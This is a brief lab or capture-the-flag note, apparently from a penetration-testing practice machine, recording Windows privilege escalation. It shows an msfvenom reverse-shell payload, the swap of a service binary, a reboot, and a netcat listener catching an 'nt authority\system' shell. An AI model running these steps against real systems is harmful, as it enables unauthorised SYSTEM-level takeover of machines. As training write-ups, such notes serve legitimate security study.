# 8 privesc

```
# tried PowerUp.ps1 | using wlbsctrl.dll
# didnt work

Using https://www.exploit-db.com/exploits/48789

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.154 LPORT=445 -f exe -o bd.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: bd.exe

# move C:\bd\bd.exe C:\bd\bd.exe.bak
# copy C:\xampp\htdocs\bd.exe C:\bd\bd.exe
# shutdown /r -t 5

$ rlwrap nc -lvnp 445
listening on [any] 445 ...
connect to [192.168.49.154] from (UNKNOWN) [192.168.154.127] 49670
Microsoft Windows [Version 10.0.18363.1139]
(c) 2019 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system
```
